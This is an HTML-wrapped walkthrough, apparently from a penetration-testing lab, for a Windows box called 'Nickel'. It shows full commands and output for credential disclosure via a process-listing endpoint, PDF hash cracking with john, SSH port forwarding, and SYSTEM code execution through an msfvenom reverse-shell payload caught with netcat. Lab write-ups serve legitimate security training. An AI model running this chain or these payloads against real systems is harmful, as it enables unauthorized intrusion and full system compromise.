@@ -1,0 +1,203 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-black"><!----><div><h1>Exploitation Guide for Nickel</h1>
+<p>In this walkthrough, we leverage a credential disclosure on a web application endpoint to gain an initial foothold on the target. We then crack a PDF password to gain information about a protected administrative application. Finally, we bypass firewall protections with port forwarding to gain access to this application, which allows RCE as the SYSTEM user.</p>
+<h2>Enumeration</h2>
+<p>We'll begin with an <code>nmap</code> TCP scan against all 65535 TCP ports.</p>
+<pre id="fence-code-1" class="fence-code"><code>kali@kali:~$ sudo nmap 192.168.120.209 -p-
+...
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+3389/tcp  open  ms-wbt-server
+8089/tcp  open  unknown
+33333/tcp open  dgi-serv
+
+Nmap done: 1 IP address (1 host up) scanned in 140.09 seconds
+</code></pre>
+<p>Next, we'll run a more detailed <code>nmap</code> scan.</p>
+<pre id="fence-code-2" class="fence-code"><code>kali@kali:~$ sudo nmap 192.168.120.209 -p8089,33333 -A
+...
+PORT      STATE SERVICE VERSION
+8089/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+33333/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+...
+</code></pre>
+<p>This doesn't reveal much useful information. At this point, we can either use <code>curl</code> to quickly examine the source code (if any) or manually visit the services with a web browser and investigate further. We choose the former and connect to the service at port <code>8089</code> with <code>curl</code>.</p>
+<pre id="fence-code-3" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.209:8089
+
+&lt;h1&gt;DevOps Dashboard&lt;/h1&gt;
+&lt;hr&gt;
+&lt;form action='http://192.168.120.209:33333/list-current-deployments' method='GET'&gt;
+&lt;input type='submit' value='List Current Deployments'&gt;
+&lt;/form&gt;
+<span class="warning-item">
+&lt;form action='http://192.168.120.209:33333/list-running-procs' method='GET'&gt;
+&lt;input type='submit' value='List Running Processes'&gt;
+&lt;/form&gt;
+<span class="warning-item">
+&lt;form action='http://192.168.120.209:33333/list-active-nodes' method='GET'&gt;
+&lt;input type='submit' value='List Active Nodes'&gt;
+&lt;/form&gt;
+</span></span></code></pre>
+<p>The <code>curl</code> output reveals that the "Devops Dashboard" application contains several form actions that make requests to a <em>second</em> endpoint on port <code>33333</code>. This was one of the open ports in the earlier <code>nmap</code> scan.</p>
+<p>We attempt several <code>GET</code> requests to the endpoints listed in the source, but the application returns a recurring error.</p>
+<pre id="fence-code-4" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.209:33333/list-current-deployments
+&lt;p&gt;Cannot "GET" /list-current-deployments&lt;/p&gt;
+
+kali@kali:~$ curl http://192.168.120.209:33333/list-running-procs
+&lt;p&gt;Cannot "GET" /list-running-procs&lt;/p&gt;
+
+kali@kali:~$ curl http://192.168.120.209:33333/list-active-nodes
+&lt;p&gt;Cannot "GET" /list-active-nodes&lt;/p&gt;
+</code></pre>
+<h2>Exploitation</h2>
+<h3>User Credentials Disclosure</h3>
+<p>Since the application seems to be expecting another HTTP verb, let's attempt <code>POST</code> requests instead. If we provide <code>curl</code> with a <code>Content-Length: 0</code> header, we can <code>POST</code> to the <code>http://192.168.120.209:33333/list-running-procs</code> endpoint to get a list of running processes on the machine.</p>
+<pre id="fence-code-5" class="fence-code"><code>kali@kali:~$ curl -s -i -X POST -H 'Content-Length: 0' http://192.168.120.209:33333/list-running-procs
+HTTP/1.1 200 OK
+Content-Length: 2629
+Server: Microsoft-HTTPAPI/2.0
+...
+name        : smss.exe
+commandline : 
+
+name        : csrss.exe
+commandline : 
+
+name        : cmd.exe
+commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+
+name        : FileZilla Server.exe
+commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
+...
+</code></pre>
+<p>The process listing reveals an interesting <strong>DevTasks.exe</strong> process command line that seems to contain encoded or encrypted credentials for <code>ariah</code>.</p>
+<pre id="fence-code-6" class="fence-code"><code>cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+</code></pre>
+<p>The command line also reveals some other potentially useful information, such as the <code>--protocol ssh</code> switch which hints at a potential pivot option.</p>
+<p>If we base64-decode the contents of the <code>-p</code> parameter, we discover what appears to be a password:</p>
+<pre id="fence-code-7" class="fence-code"><code>kali@kali:~$ echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d
+NowiseSloopTheory139
+</code></pre>
+<p>Next, we confirm that <code>ariah</code>'s decoded credentials are good for both FTP and SSH on this system:</p>
+<pre id="fence-code-8" class="fence-code"><code>kali@kali:~$ ssh ariah@192.168.120.209
+ariah@192.168.120.209's password: 
+...
+ariah@NICKEL C:\Users\ariah&gt;cd Desktop
+ariah@NICKEL C:\Users\ariah\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9451-68F7
+
+ Directory of C:\Users\ariah\Desktop
+
+09/01/2020  12:38 PM    &lt;DIR&gt;          .
+09/01/2020  12:38 PM    &lt;DIR&gt;          ..
+09/01/2020  12:38 PM                34 local.txt  
+               1 File(s)             34 bytes     
+               2 Dir(s)   5,029,847,040 bytes free
+
+ariah@NICKEL C:\Users\ariah\Desktop&gt;
+</code></pre>
+<h2>Escalation</h2>
+<p>Logging into the FTP server as <code>ariah</code> (or navigating to the <em>C:\ftp</em> directory from the SSH shell), we find an <strong>Infrastructure.pdf</strong> file. Let's use FTP to download the file making sure we also set the binary mode.</p>
+<pre id="fence-code-9" class="fence-code"><code>kali@kali:/tmp$ ftp 192.168.120.209
+...
+Name (192.168.120.209:root): ariah
+331 Password required for ariah
+Password:
+230 Logged on
+Remote system type is UNIX.
+ftp&gt; ls
+...
+-r--r--r-- 1 ftp ftp          46235 Sep 01 11:02 Infrastructure.pdf
+ftp&gt; bin
+200 Type set to I
+ftp&gt; recv Infrastructure.pdf
+...
+226 Successfully transferred "/Infrastructure.pdf"
+...
+</code></pre>
+<p>However, the <strong>Infrastructure.pdf</strong> file is password protected. Let's try to extract the password hash from the PDF with John the Ripper's <code>pdf2john.pl</code> utility.</p>
+<pre id="fence-code-10" class="fence-code"><code>kali@kali:/tmp$ perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash
+Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
+</code></pre>
+<p>Using <code>john</code>, let's try to crack the hash using the <strong>rockyou.txt</strong> wordlist.</p>
+<pre id="fence-code-11" class="fence-code"><code>kali@kali:/tmp$ john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt
+Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
+...
+ariah4168        (Infrastructure.pdf)
+1g 0:00:01:22 DONE (2020-09-18 15:38) 0.01212g/s 121263p/s 121263c/s 121263C/s ariah4168..ariadne01
+...
+</code></pre>
+<p>Opening the <strong>Infrastructure.pdf</strong> file with the <code>ariah4168</code> password reveals some information about other potential targets:</p>
+<pre id="fence-code-12" class="fence-code"><code>Infrastructure Notes
+Temporary Command endpoint: http://nickel/?
+Backup system: http://nickel-backup/backup
+NAS: http://corp-nas/files
+</code></pre>
+<p>The <code>Temporary Command endpoint</code> at <code>http://nickel/?</code> gets our attention. This is interesting since port <code>80</code>  wasn't initially identified by our earlier Nmap scan. However, <code>netstat -an</code> (run from our SSH shell) reveals that a service is running on port 80:</p>
+<pre id="fence-code-13" class="fence-code"><code>ariah@NICKEL C:\Users\ariah\Desktop&gt;netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+...
+</code></pre>
+<p>Clearly this port is being blocked. We may be able to bypass this with an SSH port forward:</p>
+<pre id="fence-code-14" class="fence-code"><code>kali@kali:~$ sudo ssh -L 80:192.168.120.209:80 ariah@192.168.120.209
+...
+Microsoft Windows [Version 10.0.18362.1016]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+ariah@NICKEL C:\Users\ariah&gt;
+</code></pre>
+<p>Once our port forward is set up, we can issue <code>curl</code> requests to <code>http://localhost/?</code> to hit the target service.  After several attempts, we succeed in running operating system commands like <code>whoami</code> with this syntax:</p>
+<pre id="fence-code-15" class="fence-code"><code>kali@kali:~$ curl http://localhost/?whoami
+
+&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;dev-api started at 2020-09-18T11:14:22
+
+	&lt;pre&gt;nt authority\system
+&lt;/pre&gt;
+&lt;/body&gt;&lt;/html&gt;kali@kali:~$
+</code></pre>
+<p>This indicates that we can run commands as SYSTEM! Let's further this access to get an actual shell. We'll first generate a payload.</p>
+<pre id="fence-code-16" class="fence-code"><code>kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=443 -f exe &gt; /tmp/payload.exe
+</code></pre>
+<p>We can then use our existing SSH credentials for <code>ariah</code> to upload our payload to the target directory.</p>
+<pre id="fence-code-17" class="fence-code"><code>kali@kali:~$ scp /tmp/payload.exe ariah@192.168.120.209:C:\\users\\ariah\\desktop\\payload.exe
+ariah@192.168.120.209's password: 
+payload.exe                                                                  100%    0     0.0KB/s   00:00
+</code></pre>
+<p>Let's configure a netcat listener to catch our reverse shell.</p>
+<pre id="fence-code-18" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 443
+listening on [any] 443 ...
+</code></pre>
+<p>Finally, we can issue the final <code>curl</code> request to execute our payload.</p>
+<pre id="fence-code-19" class="fence-code"><code>kali@kali:~$ curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
+</code></pre>
+<p>Success! We caught our reverse SYSTEM shell.</p>
+<pre id="fence-code-20" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.118.11] from (UNKNOWN) [192.168.120.209] 49683
+Microsoft Windows [Version 10.0.18362.1016]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami 
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
